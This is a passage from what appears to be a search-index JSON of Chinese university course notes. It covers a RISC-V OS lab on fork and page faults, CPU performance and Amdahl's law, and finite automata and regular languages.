}\n</code></pre>"},{"location":"cs/system/cs3/lab5/#_4","title":"\u5b9e\u9a8c\u6d4b\u8bd5\u7ed3\u679c","text":""},{"location":"cs/system/cs3/lab5/#main","title":"\u7b2c\u4e00\u4e2a main","text":"<p>\u53ef\u4ee5\u6839\u636e log \u770b\u5230 proc_init \u65f6\u8fdb\u884c\u7684 do_mmap\uff0c\u4ee5\u53ca\u5728\u6bcf\u4e2a\u8fdb\u7a0b\u8fd0\u884c\u65f6\u89e6\u53d1\u4e24\u6b21\u9884\u671f\u4e2d\u7684 page fault\uff0c\u6bcf\u6b21\u4e4b\u540e\u89e6\u53d1\u4e86 create_mapping\uff0c\u7136\u540e\u8fdb\u7a0b\u6b63\u5e38\u8fd0\u884c\u3002</p>"},{"location":"cs/system/cs3/lab5/#main_1","title":"\u7b2c\u4e8c\u4e2a main","text":"<p>\u53ef\u4ee5\u770b\u5230 proc_init \u53ea\u521b\u5efa\u4e86\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u7136\u540e\u8fdb\u5165 main \u540e\u8c03\u7528\u4e86 fork\uff0cfork \u4e2d\u8fdb\u884c\u4e86 do_mmap \u6709 log \u8f93\u51fa\u3002\u7136\u540e\u76f4\u63a5\u8fd4\u56de\u5230\u7236\u8fdb\u7a0b\u4e2d\uff0cfork \u8fd4\u56de\u503c\u7ed3\u679c\u4e3a 2 \u5373\u5b50\u8fdb\u7a0b pid\uff0c\u7136\u540e\u8f93\u51fa\u4e86\u7236\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002</p> <p>\u4e4b\u540e\u8fdb\u7a0b\u8c03\u5ea6\u5207\u6362\u5230\u4e86\u5b50\u8fdb\u7a0b\u4e2d\uff0c\u540c\u6837\u89e6\u53d1\u4e86\u4e24\u6b21 page fault \u8fdb\u884c\u4e86\u6620\u5c04\u521b\u5efa\uff0c\u7136\u540e\u6b63\u5e38\u6267\u884c\uff0c\u5f97\u5230 fork \u8fd4\u56de\u503c\u4e3a 0\uff0c\u8f93\u51fa\u4e86\u5b50\u8fdb\u7a0b\u4fe1\u606f\u3002\u540e\u7eed\u6ca1\u5728\u622a\u56fe\u4e2d\uff0c\u4f46\u90fd\u5728\u4e00\u76f4\u6b63\u5e38\u8fd0\u884c\u3002</p>"},{"location":"cs/system/cs3/lab5/#main_2","title":"\u7b2c\u4e09\u4e2a main","text":"<p>\u8fd9\u90e8\u5206 do_mmap create_mapping \u548c page fault \u7684 log \u8f93\u51fa\u8fc7\u591a\u5f71\u54cd\u89c2\u5bdf\uff0c\u6240\u4ee5\u5c06\u90a3\u4e9b log \u7981\u7528\u4e86\uff1a</p> <p>\u53ef\u4ee5\u770b\u5230 pid 1 \u5148 fork \u51fa\u4e86 2\uff0c\u7136\u540e fork \u51fa\u4e86 3\uff0c\u4e4b\u540e\u8c03\u5ea6\u5230\u5b50\u8fdb\u7a0b 2 \u65f6\u53c8\u901a\u8fc7\u4ee3\u7801\u4e2d\u7b2c\u4e8c\u4e2a fork \u521b\u5efa\u4e86 4 \u53f7\u8fdb\u7a0b\uff0c\u7136\u540e\u56db\u4e2a\u8fdb\u7a0b\u4e00\u76f4\u5728\u6b63\u5e38\u8fd0\u884c\uff0c\u7b26\u5408\u9884\u671f\u3002</p>"},{"location":"cs/system/cs3/lab5/#_5","title":"\u601d\u8003\u9898","text":"<p>\u6839\u636e\u5b9e\u73b0\uff0c\u5206\u6790\u7236\u8fdb\u7a0b\u5728\u7528\u6237\u6001\u6267\u884c fork \u81f3\u5b50\u8fdb\u7a0b\u88ab\u8c03\u5ea6\u5e76\u5728\u7528\u6237\u6001\u6267\u884c\u7684\u8fc7\u7a0b\uff0c\u6700\u597d\u80fd\u591f\u5c06\u5bc4\u5b58\u5668\u72b6\u6001\u7684\u53d8\u5316\u8fc7\u7a0b\u6e05\u6670\u8bf4\u660e\u3002</p> <p>\u7236\u8fdb\u7a0b\u5728\u7528\u6237\u6001\u6267\u884c fork\uff0c\u5373\u8c03\u7528\u4e86 ecall\uff0c\u89e6\u53d1\u4e86 Environment Call from U-mode \u5f02\u5e38\uff0c\u88ab\u6355\u83b7\uff0c\u8fdb\u5165\u5230 _traps \u4e2d\uff0c\u4fee\u6539 sp \u5230\u5185\u6838\u6808\uff08\u539f sp \u4fdd\u5b58\u5230 sscratch \u4e2d\uff09\uff0c\u7136\u540e\u5c06\u5bc4\u5b58\u5668\uff08pt_regs\uff09\u4fdd\u5b58\u5230\u5185\u6838\u6808\u4e0a\u3002\u5904\u7406\u53c2\u6570\uff0c\u8fdb\u5165\u5230 trap_handler \u4e2d\uff0c\u5224\u65ad scause \u4e3a 8\uff0c\u8fdb\u5165\u5230 syscall \u51fd\u6570\u4e2d\uff0c\u5224\u65ad x7 \u4e3a SYS_clone\uff0c\u8c03\u7528 do_fork(regs)\u3002</p> <p>do_fork \u4e2d\u521b\u5efa\u4e86\u5b50\u8fdb\u7a0b\uff0c\u76f8\u5173\u5bc4\u5b58\u5668\u8bbe\u7f6e\u4e3a\u4e86\u5185\u6838\u6808\u4e0a\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u503c\uff0c\u4f46\u9700\u8981\u4fee\u6539 sp\uff0c\u56e0\u4e3a\u6808\u4e0a\u4fdd\u5b58\u7684\u662f\u5185\u6838\u6808 sp\uff0c\u9700\u8981\u6539\u4e3a sscratch \u4e2d\u5b58\u653e\u7684\u4e4b\u524d\u7684\u7528\u6237\u6808\u5f53\u524d sp\u3002\u4ee5\u53ca\u4fee\u6539 a0 \u4e3a 0\uff0c\u5373 fork \u8fd4\u56de\u503c\u4e3a 0\u3002\u9664\u6b64\u4e4b\u5916\u9700\u8981\u6ce8\u610f\u7684\u662f thread.ra \u8bbe\u7f6e\u4e3a\u4e86 forkret\uff0c\u7a0d\u540e\u8981\u7528\u5230\u3002</p> <p>do_fork \u7ed3\u675f\u540e\u8fd4\u56de\u4e86\u5b50\u8fdb\u7a0b pid\uff0c\u5199\u5165\u4e86 a0 \u4e2d\uff0ctrap_handler \u7ed3\u675f\uff0c\u6062\u590d\u6808\u4e0a\u5bc4\u5b58\u5668\u503c\uff0c\u5207\u6362\u5185\u6838\u6808\u548c\u7528\u6237\u6808\uff0c\u4ece\u5185\u6838\u6001\u8fd4\u56de\uff0cfork \u7cfb\u7edf\u8c03\u7528\u7ed3\u675f\uff0c\u7236\u8fdb\u7a0b\u6b63\u5e38\u7ee7\u7eed\u8fd0\u884c\u3002</p> <p>\u5b50\u8fdb\u7a0b\u88ab\u8c03\u5ea6\u5230\u540e\uff0c\u8fdb\u884c __switch_to\uff0c\u4fdd\u5b58\u7236\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4fe1\u606f\uff0c\u6062\u590d\u5b50\u8fdb\u7a0b\u4e0a\u4e0b\u6587\uff0c\u5b50\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u9664\u4e86 ra \u4ee5\u5916\u90fd\u4e0d\u91cd\u8981\uff0cra \u5bfc\u81f4\u8fd4\u56de\u8df3\u8f6c\u5230\u4e86 forkret \u4f4d\u7f6e\uff0c\u5176\u4e2d\u8c03\u7528\u4e86 ret_from_fork\uff0c\u53c2\u6570\u4e3a\u5f53\u524d\u8fdb\u7a0b\u7684 trapframe \u5730\u5740\u3002ret_from_fork \u4e2d\u5c06 trapframe \u4e2d\u7684\u5bc4\u5b58\u5668\u503c\u5168\u90e8\u6062\u590d\uff0c\u8bbe\u7f6e\u597d sepc \u4e3a\u7cfb\u7edf\u8c03\u7528 ecall \u7684\u4e0b\u4e00\u6761\u5730\u5740\uff0c\u901a\u8fc7 sret \u8fd4\u56de\u5230\u7528\u6237\u6001 ecall \u4e0b\u4e00\u6761\u5730\u5740\u7684\u4f4d\u7f6e\uff0c\u7ee7\u7eed\u6267\u884c\u3002\u6b64\u65f6\u7684\u5bc4\u5b58\u5668\u72b6\u6001\u5c31\u662f do_fork \u4e2d\u8bbe\u7f6e\u7684\u5b50\u8fdb\u7a0b\u5bc4\u5b58\u5668\u503c\uff0c\u6240\u4ee5\u6b63\u786e\u8bbe\u7f6e\u597d\u4e86 sp \u503c\u4ee5\u53ca a0\uff0c\u5f97\u5230\u4e86 fork \u8fd4\u56de\u503c\u4e3a 0\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u5b50\u8fdb\u7a0b\u5728\u7528\u6237\u6001\u6b63\u5e38\u6267\u884c\u4e86\u3002</p>"},{"location":"cs/system/cs3/topic1/","title":"\u7cfb\u7edf\u91cf\u5316\u7814\u7a76\u65b9\u6cd5","text":"<p> \u7ea6 421 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162 \u7b2c 2 \u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/system/cs3/topic1/#cpu","title":"CPU \u6027\u80fd","text":"<ul> <li>CPU \u6267\u884c\u65f6\u95f4 = CPU \u65f6\u949f\u5468\u671f\u6570 * CPU \u65f6\u949f\u5468\u671f\u65f6\u95f4 = CPU \u65f6\u949f\u5468\u671f\u6570 / CPU \u65f6\u949f\u9891\u7387</li> <li>IC\uff1aInstruction Count\uff0c\u6307\u4ee4\u6570</li> <li>CPI\uff1aCycle Per Instruction\uff0c\u6bcf\u6761\u6307\u4ee4\u7684\u65f6\u949f\u5468\u671f\u6570<ul> <li>\u7531 CPU \u786c\u4ef6\u51b3\u5b9a</li> <li>\u4e0d\u540c\u7684\u6307\u4ee4\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684 CPI\uff0c\u5e73\u5747 CPI \u53d6\u51b3\u4e8e\u6307\u4ee4\u7684\u7ec4\u5408\u65b9\u5f0f</li> <li>CPI = CPU \u65f6\u949f\u5468\u671f\u6570 / IC</li> <li>CPU \u6267\u884c\u65f6\u95f4 = IC * CPI / CPU \u65f6\u949f\u9891\u7387</li> </ul> </li> </ul>"},{"location":"cs/system/cs3/topic1/#amdahl","title":"Amdahl \u5b9a\u5f8b","text":"<ul> <li>Amdahl \u5b9a\u5f8b\u6307\u51fa\u4e86\uff0c\u5f53\u63d0\u5347\u7cfb\u7edf\u6027\u80fd\u65f6\uff0c\u6709\u591a\u5927\u7684\u6536\u76ca\u53d7\u9650\u4e8e\u88ab\u63d0\u5347\u7684\u90e8\u5206\u6240\u5360\u7684\u8fd0\u884c\u65f6\u95f4\u6bd4\u4f8b</li> <li>\\(T_\\text{improved} = \\dfrac{T_\\text{affected}}{\\text{improvement factor}} + T_\\text{unaffected}\\)</li> <li>\u52a0\u901f\u6bd4 Sp = \u6539\u8fdb\u540e\u7684\u8fd0\u884c\u65f6\u95f4 / \u6539\u8fdb\u524d\u7684\u8fd0\u884c\u65f6\u95f4</li> <li>\\(T_\\text{new} = T_\\text{old}\\times \\left((1-f)+\\dfrac{f}{Sp}\\right)\\)</li> <li>\\(Sp_\\text{overall} = \\dfrac{T_\\text{old}}{T_\\text{new}} = \\dfrac{1}{(1-f)+\\dfrac{f}{Sp}}\\)<ul> <li>\u5176\u4e2d \\(Sp\\) \u4e3a\u88ab\u4f18\u5316\u90e8\u5206\u7684\u52a0\u901f\u6bd4\uff0c\\(Sp_\\text{overall}\\) \u4e3a\u6574\u4f53\u52a0\u901f\u6bd4\uff0c\\(f\\) \u4e3a\u88ab\u4f18\u5316\u90e8\u5206\u6240\u5360\u7684\u8fd0\u884c\u65f6\u95f4\u6bd4\u4f8b</li> </ul> </li> </ul>"},{"location":"cs/system/cs3/topic1/#_2","title":"\u7ecf\u5178\u7684\u4f53\u7cfb\u7ed3\u6784\u601d\u60f3","text":"<ul> <li>\u6469\u5c14\u5b9a\u5f8b<ul> <li>\u6bcf\u8fc7 18-24 \u4e2a\u6708\uff0c\u96c6\u6210\u7535\u8def\u7684\u6676\u4f53\u7ba1\u6570\u91cf\u5c06\u589e\u52a0\u4e00\u500d</li> </ul> </li> <li>\u4f7f\u7528\u62bd\u8c61\u6765\u7b80\u5316\u8bbe\u8ba1</li> <li>\u8ba9\u6700\u5e38\u89c1\u7684\u60c5\u51b5\u66f4\u5feb</li> <li>\u901a\u8fc7\u5e76\u884c\u6765\u63d0\u9ad8\u6027\u80fd<ul> <li>\u7531\u5f88\u591a\u7ea7\u522b\u7684\u5e76\u884c\uff0c\u6bd4\u5982\u6307\u4ee4\u96c6\u5e76\u884c\u3001\u8fdb\u7a0b\u5e76\u884c\u7b49</li> </ul> </li> <li>\u901a\u8fc7\u6d41\u6c34\u7ebf\u6765\u63d0\u9ad8\u6027\u80fd<ul> <li>\u5c06\u4efb\u52a1\u5206\u4e3a\u591a\u6bb5\uff0c\u8ba9\u591a\u4e2a\u4efb\u52a1\u7684\u4e0d\u540c\u9636\u6bb5\u540c\u65f6\u8fdb\u884c</li> <li>\u901a\u5e38\u7528\u6765\u63d0\u9ad8\u6307\u4ee4\u541e\u5410\u91cf</li> </ul> </li> <li>\u901a\u8fc7\u9884\u6d4b\u6765\u63d0\u9ad8\u6027\u80fd</li> <li>\u4f7f\u7528\u5c42\u6b21\u5316\u7684\u5185\u5b58<ul> <li>\u8ba9\u6700\u5e38\u8bbf\u95ee\u7684\u6570\u636e\u5728\u66f4\u9ad8\u5c42\u7ea7\uff0c\u8bbf\u95ee\u66f4\u5feb</li> </ul> </li> </ul>"},{"location":"cs/tcs/toc/","title":"\u8ba1\u7b97\u7406\u8bba","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u7406\u8bba\u8ba1\u7b97\u673a\u79d1\u5b66\u5bfc\u5f15\u201d \u8bfe\u7a0b\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u7406\u8bba\u8ba1\u7b97\u673a\u79d1\u5b66\u5bfc\u5f15</li> </ul>"},{"location":"cs/tcs/toc/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u8bed\u8a00\u3001\u81ea\u52a8\u673a\u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00</li> <li>\u56fe\u7075\u673a\u7406\u8bba\u57fa\u7840</li> <li>\u5224\u5b9a\u95ee\u9898</li> <li>\u51fd\u6570\u53ef\u8ba1\u7b97\u6027</li> <li>\u590d\u6742\u5ea6\u7406\u8bba</li> </ul>"},{"location":"cs/tcs/toc/topic1/","title":"\u8bed\u8a00\u3001\u81ea\u52a8\u673a\u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p> \u7ea6 3850 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p> <p>Abstract</p> <p>\u7406\u8bba\u8ba1\u7b97\u673a\u79d1\u5b66\u5bfc\u5f15\u7b2c\u4e00\u81f3\u7b2c\u56db\u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/tcs/toc/topic1/#_2","title":"\u524d\u8a00","text":"<ul> <li>\u95ee\u9898\u5206\u7c7b<ul> <li>\u4f18\u5316\u95ee\u9898\uff08Optimization Problem\uff09\u5982\u6700\u5c0f\u751f\u6210\u6811</li> <li>\u641c\u7d22\u95ee\u9898\uff08Search Problem\uff09\u5982\u627e\u4e00\u68f5\u6743\u91cd\u6700\u5927\u4e3a k \u7684\u751f\u6210\u6811</li> <li>\u51b3\u7b56\u95ee\u9898\uff08Decision Problem\uff09\u5982\u5224\u65ad\u662f\u5426\u5b58\u5728\u4e00\u68f5\u6743\u91cd\u6700\u5927\u4e3a k \u7684\u751f\u6210\u6811</li> <li>\u8ba1\u6570\u95ee\u9898\uff08Counting Problem\uff09</li> </ul> </li> <li>\u51b3\u7b56\u95ee\u9898\u6700\u7b80\u5355<ul> <li>\u5bf9\u4e8e\u4e00\u4e2a\u95ee\u9898\u6709 yes-instance \u548c no-instance</li> <li>\u95ee\u9898\u53ef\u4ee5\u8f6c\u5316\u4e3a Given a string \\(w\\), whether \\(w\\in \\{\\text{encoding of yes-instance}\\}\\)</li> <li>\\(\\{\\text{encoding of yes-instance}\\}\\) \u5c31\u662f\u4e00\u4e2a\u8bed\u8a00\uff08Language\uff09</li> </ul> </li> </ul>"},{"location":"cs/tcs/toc/topic1/#_3","title":"\u8bed\u8a00\u5b9a\u4e49","text":"<ul> <li>\u5b57\u6bcd\u8868 Alphabet: finite set of symbols<ul> <li>\\(\\Sigma = \\{a, b, c\\}\\)\u3001\\(\\Sigma = \\{0, 1\\}\\)\u3001\\(\\Sigma = \\{\\ \\}\\)</li> </ul> </li> <li>\u5b57\u7b26\u4e32 String over \\(\\Sigma\\): finite sequence of symbols from \\(\\Sigma\\)<ul> <li>\\(w = 010101\\)\uff0c\\(w = e\\)\uff08\u6216 \\(\\epsilon\\)\uff09\u662f\u7a7a\u4e32</li> <li>\\(|w|\\) \u8868\u793a\u5b57\u7b26\u4e32\u957f\u5ea6\uff0c\\(|e| = 0\\)</li> <li>\\(\\Sigma^i\\): set of all strings of length \\(i\\) over \\(\\Sigma\\)</li> <li>\\(\\Sigma^* = \\bigcup_{i\\geq 0} \\Sigma^i\\)\uff08\\(\\Sigma\\) \u4e0a\u6240\u6709\u5b57\u7b26\u4e32\uff09\uff0c\\(\\Sigma^+ = \\bigcup_{i\\geq 1} \\Sigma^i\\)</li> <li>\u5b57\u7b26\u4e32\u64cd\u4f5c<ul> <li>\u62fc\u63a5\uff08concatenation\uff09\uff1a\\(w_1w_2\\)\uff0c\\(|w_1w_2| = |w_1| + |w_2|\\)</li> <li>\u53cd\u8f6c\uff08reversal\uff09\uff1a\\(w^R\\)\uff0c\\(|w^R| = |w|\\)</li> <li>\u91cd\u590d\uff08exponentiation\uff09\uff1a\\(w^i = \\underbrace{ww\\cdots w}_{i\\ times}\\)\uff0c\\(|w^i| = i|w|\\)</li> </ul> </li> </ul> </li> <li>\u8bed\u8a00 Language over \\(\\Sigma\\): any subset of \\(\\Sigma^*\\)</li> </ul>"},{"location":"cs/tcs/toc/topic1/#_4","title":"\u81ea\u52a8\u673a","text":"<p>\u81ea\u52a8\u673a\uff08finite automata\uff09\u6709\u4e24\u79cd\uff1a</p> <ul> <li>Deterministic Finite Automata (DFA)\uff1a\u786e\u5b9a\u6027\u6709\u9650\u81ea\u52a8\u673a\uff0c\u6bcf\u4e00\u6b65\u7684\u8f6c\u79fb\u90fd\u662f\u786e\u5b9a\u7684</li> <li>Non-deterministic Finite Automata (NFA)\uff1a\u975e\u786e\u5b9a\u6027\u6709\u9650\u81ea\u52a8\u673a\uff0c\u6bcf\u4e00\u6b65\u7684\u8f6c\u79fb\u53ef\u4ee5\u6709\u591a\u79cd\u9009\u62e9</li> </ul>"},{"location":"cs/tcs/toc/topic1/#dfa","title":"DFA","text":"<ul> <li>\u5982\u4e0a\u56fe\u5c31\u662f\u4e00\u4e2a DFA\uff0c\\(q_0\\) \u662f\u521d\u59cb\u72b6\u6001\uff0c\u53cc\u5708 \\(q_1\\) \u662f\u63a5\u53d7\u72b6\u6001\uff0c\u7bad\u5934\u4e0a\u7684\u5b57\u6bcd\u662f\u8f6c\u79fb\u6761\u4ef6</li> <li>\u4e00\u4e2a NFA \u5b9a\u4e49\u4e3a\u4e00\u4e2a\u4e94\u5143\u7ec4 \\(M = (K, \\Sigma, \\delta, s, F)\\)<ul> <li>\\(K\\)\uff1a\u72b6\u6001\u96c6\u5408</li> <li>\\(\\Sigma\\)\uff1a\u5b57\u6bcd\u8868</li> <li>\\(\\delta\\)\uff1a\u8f6c\u79fb\u51fd\u6570\uff0c\\(\\delta\\colon K\\times \\Sigma \\to K\\)</li> <li>\\(s\\)\uff1a\u521d\u59cb\u72b6\u6001</li> <li>\\(F\\)\uff1a\u63a5\u53d7\u72b6\u6001\u96c6\u5408</li> </ul> </li> <li>\u6267\u884c\u903b\u8f91\uff1a\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4ece\u521d\u59cb\u72b6\u6001\uff0c\u6bcf\u6b21\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u6839\u636e\u5f53\u524d\u72b6\u6001\u548c\u5b57\u7b26\u67e5\u627e\u8f6c\u79fb\u51fd\u6570\uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a\u72b6\u6001\uff0c\u76f4\u5230\u5b57\u7b26\u4e32\u4e3a\u7a7a</li> <li>configuation\uff1a\\(C = (q, w)\\)\uff0c\u8868\u793a\u5f53\u524d\u72b6\u6001 \\(q\\) \u548c\u5269\u4f59\u5b57\u7b26\u4e32 \\(w\\)</li> <li>yields<ul> <li>yields in one step\uff1a\u53ef\u4e00\u6b65\u8f6c\u79fb\u5230<ul> <li>\u8bb0\u4e3a \\((q, w)\\vdash_M (q', w')\\)\uff0cif \\(w=aw'\\) for some \\(a\\in\\Sigma\\) and \\(\\delta(q, a) = q'\\)</li> </ul> </li> <li>yields\uff1a\u53ef\u8f6c\u79fb\u5230<ul> <li>\u8bb0\u4e3a \\((q, w)\\vdash_M^* (q', w')\\)\uff0cif \\((q, w)\\vdash_M (q_1, w_1)\\vdash_M \\cdots \\vdash_M (q', w')\\)</li> </ul> </li> </ul> </li> <li>\u81ea\u52a8\u673a\u63a5\u53d7\u5b57\u7b26\u4e32<ul> <li>\\(M\\) accepts \\(w\\in\\Sigma^*\\), if \\((s, w)\\vdash_M^* (q, e)\\) for some \\(q\\in F\\)</li> <li>\u5373\u53ef\u4ee5\u4ece\u521d\u59cb\u72b6\u6001 \\(s\\) \u901a\u8fc7\u4e00\u7cfb\u5217\u8f6c\u79fb\u5f97\u5230\u63a5\u53d7\u72b6\u6001 \\(q\\)\uff0c\u4e14\u5269\u4f59\u5b57\u7b26\u4e32\u4e3a\u7a7a</li> </ul> </li> <li>\u81ea\u52a8\u673a\u5bf9\u5e94\u7684\u8bed\u8a00\uff08Language of \\(M\\)\uff09<ul> <li>\\(L(M) = \\{w\\in\\Sigma^*: M\\text{ accepts }w\\}\\)</li> <li>\u5373\u6240\u6709\u80fd\u88ab\u81ea\u52a8\u673a\u63a5\u53d7\u7684\u5b57\u7b26\u4e32</li> </ul> </li> <li>\u81ea\u52a8\u673a\u63a5\u53d7\u7684\u8bed\u8a00<ul> <li>\\(M\\) accepts \\(L\\) if \\(M\\) accepts every string in \\(L\\) and rejects every string not in \\(L\\)</li> <li>\\(M\\) accepts \\(L(M)\\)</li> </ul> </li> </ul>"},{"location":"cs/tcs/toc/topic1/#nfa","title":"NFA","text":"<ul> <li>\u5982\u4e0a\u56fe\u662f\u4e00\u4e2a NFA\uff0c\u548c DFA \u6709\u4ee5\u4e0b\u4e24\u4e2a\u533a\u522b\uff1a<ul> <li>\u4e00\u4e2a\u72b6\u6001\u540c\u4e00\u6761\u4ef6\u53ef\u4ee5\u6709\u591a\u4e2a\u8f6c\u79fb\u65b9\u6848</li> <li>\u53ef\u4ee5\u6709 \\(e\\)-transition\uff0c\u5373\u4e0d\u6d88\u8017\u5b57\u7b26\u7684\u8f6c\u79fb</li> </ul> </li> <li>\u540c\u6837\u5b9a\u4e49\u4e3a\u4e94\u5143\u7ec4 \\(M = (K, \\Sigma, \\Delta, s, F)\\)<ul> <li>\u548c DFA \u533a\u522b\u53ea\u5728 \\(\\Delta\\)\uff0c\u662f\u4e00\u4e2a\u6bd4\u51fd\u6570\u66f4\u4e00\u822c\u7684\u5173\u7cfb\uff08relation\uff09</li> <li>\\(\\Delta\\)\uff1a\u8f6c\u79fb\u5173\u7cfb\uff0c\\(\\Delta\\subseteq K\\times (\\Sigma\\cup\\{e\\})\\times K\\)</li> </ul> </li> <li>\u5bf9\u4e8e\u4e00\u4e2a\u8f93\u5165\uff0cNFA \u53ef\u4ee5\u6709\u591a\u79cd\u8def\u7ebf\uff0c\u4f46\u53ea\u8981\u6709\u4e00\u79cd\u8def\u7ebf\u80fd\u591f\u63a5\u53d7\uff0c\u5c31\u8ba4\u4e3a NFA \u63a5\u53d7\u8be5\u8f93\u5165<ul> <li>\u4e00\u79cd\u7406\u89e3\u65b9\u5f0f\uff1aNFA \u53ef\u4ee5\u731c\u6d4b\u8be5\u5f80\u54ea\u91cc\u8f6c\u79fb\uff0c\u4e14\u603b\u80fd\u731c\u5bf9</li> </ul> </li> </ul> Ex. \u6784\u9020 NFA \u63a5\u53d7 \\(L=\\{w\\in\\{a, b\\}^*: \\text{the second symbol from the end is }b\\}\\)"},{"location":"cs/tcs/toc/topic1/#nfa-dfa","title":"NFA \u4e0e DFA","text":"<ul> <li>NFA \u867d\u7136\u770b\u8d77\u6765\u6bd4 DFA \u5f3a\u5927\uff0c\u4f46\u5176\u4e8c\u8005\u5b9e\u9645\u4e0a\u662f\u7b49\u4ef7\u7684<ul> <li>\\(\\forall\\) NFA \\(M\\)\uff0c\\(\\exists\\) DFA \\(M'\\)\uff0cs.t. \\(L(M) = L(M')\\)</li> <li>\\(\\forall\\) DFA \\(M\\)\uff0c\\(\\exists\\) NFA \\(M'\\)\uff0cs.t. \\(L(M) = L(M')\\)</li> </ul> </li> <li>NFA \u8f6c DFA \u4e3b\u8981\u601d\u8def<ul> <li>NFA \u63a5\u6536\u4e00\u4e2a\u5b57\u7b26\uff0c\u4f1a\u6709\u591a\u4e2a\u8f6c\u79fb\u65b9\u6848\uff0c\u6240\u6709\u53ef\u8fbe\u7684\u4e0b\u4e00\u72b6\u6001\u5408\u5728\u4e00\u8d77\u7684\u96c6\u5408\u6784\u6210 DFA \u7684\u4e00\u4e2a\u72b6\u6001</li> <li>\u5373 DFA \u7684\u72b6\u6001\u662f NFA \u7684\u72b6\u6001\u7684\u5e42\u96c6\uff0c\u7ed3\u675f\u72b6\u6001\u662f\u5305\u542b NFA \u7684\u7ed3\u675f\u72b6\u6001\u7684 DFA \u72b6\u6001</li> <li>\\(e\\)-transition \u4e5f\u8981\u8003\u8651\uff0c\u4e14\u4e0d\u7b97\u5728\u5b57\u7b26\u6570\u91cc</li> </ul> </li> <li>NFA \\(M=(K, \\Sigma, \\Delta, s, F)\\) \u8f6c\u4e3a DFA \\(M'=(K', \\Sigma, \\delta, s', F')\\)<ul> <li>\\(K' = 2^K = \\{Q: Q\\subseteq K\\}\\)</li> <li>\\(F' = \\{Q\\in K': Q\\cap F\\neq \\emptyset\\}\\)</li> <li>\\(s' = E(s)\\)<ul> <li>\u5b9a\u4e49 \\(\\forall q\\in K, E(q) = \\{p\\in K: (q, e)\\vdash_M^* (p, e)\\}\\)</li> <li>\u5373 \\(E(q)\\) \u662f \\(q\\) \u53ef\u4ee5\u901a\u8fc7 \\(e\\)-transition \u5230\u8fbe\u7684\u72b6\u6001\u96c6\u5408</li> </ul> </li> <li>\\(\\delta\\): \\(\\forall Q\\in K', \\forall a\\in\\Sigma\\)</li> </ul> </li> </ul> \\[ \\delta(Q, a) = \\bigcup_{q\\in Q}\\ \\bigcup_{p: (q, a, p)\\in\\Delta}E(p) \\] \u4e00\u4e2a NFA \u8f6c DFA \u7684\u5177\u4f53\u4f8b\u5b50 <p>  \u53f3\u4fa7 DFA \u7684\u4e0b\u8fb9\u90e8\u5206\u662f\u5197\u4f59\u7684\uff0c\u53ef\u4ee5\u5220\u6389\u3002</p>"},{"location":"cs/tcs/toc/topic1/#_5","title":"\u6b63\u5219\u8bed\u8a00","text":"<ul> <li>A language is regular if it is accepted by some FA<ul> <li>\u6709\u81ea\u52a8\u673a\u53ef\u4ee5\u63a5\u53d7\u7684\u8bed\u8a00\u662f\u6b63\u5219\u7684</li> </ul> </li> <li>Regular Operations<ul> <li>Union: \\(A\\cup B = \\{w: w\\in A\\text{ or }w\\in B\\}\\)</li> <li>Concatenation: \\(A\\circ B = \\{ab: a\\in A\\text{ and }b\\in B\\}\\)</li> <li>Star: \\(A^* = \\{w_1w_2\\cdots w_k: k\\geq 0\\text{ and each }w_i\\in A\\}\\)</li> </ul> </li> <li>\u5b9a\u7406\uff1a<ul> <li>\u5982\u679c \\(A\\) \u548c \\(B\\) \u662f\u6b63\u5219\u8bed\u8a00\uff0c\u5219 \\(A\\cup B\\)\u3001\\(A\\circ B\\)\u3001\\(A^*\\) \u4e5f\u662f\u6b63\u5219\u8bed\u8a00</li> </ul> </li> <li>claim\uff1a\u5982\u679c NFA \\(M\\) accepts \\(w\\)\uff0c\u5219\u8f6c\u4e3a\u7684 DFA \\(M'\\) accepts \\(w\\)\uff0c\u53cd\u4e4b\u4e5f\u6210\u7acb<ul> <li>Corollary\uff1aa language is regular \\(\\iff\\) it is accepted by some DFA</li> </ul> </li> </ul> Proof. if \\(A\\) and \\(B\\) are regular, so is \\(A\\cup B\\) <p>\u601d\u8def\uff1a\u5408\u5e76\u4e24\u4e2a\u63a5\u6536 \\(A\\) \u548c \\(B\\) \u7684 DFA</p> <p>\\(\\exists M_A=(K_A, \\Sigma, \\delta_A, s_A, F_A)\\text{ accepts }A\\)\uff0c\\(\\exists M_B=(K_B, \\Sigma, \\delta_B, s_B, F_B)\\text{ accepts }B\\)</p> <p>\\(\\text{let }M=(K, \\Sigma, \\delta, s, F)\\)\uff0cwhere:</p> <ul> <li>\\(K = K_A\\times K_B\\)</li> <li>\\(s = (s_A, s_B)\\)</li> <li>\\(F = \\{(q_A, q_B): q_A\\in F_A\\text{ or }q_B\\in F_B\\}\\)</li> <li>\\(\\delta\\): \\(\\forall q_A\\in K_A, \\forall q_B\\in K_B, \\forall a\\in\\Sigma,\\ \\delta\\big((q_A, q_B), a\\big) = \\big(\\delta_A(q_A, a), \\delta_B(q_B, a)\\big)\\)</li> </ul> <p>\\(\\text{then }M\\text{ accepts }A\\cup 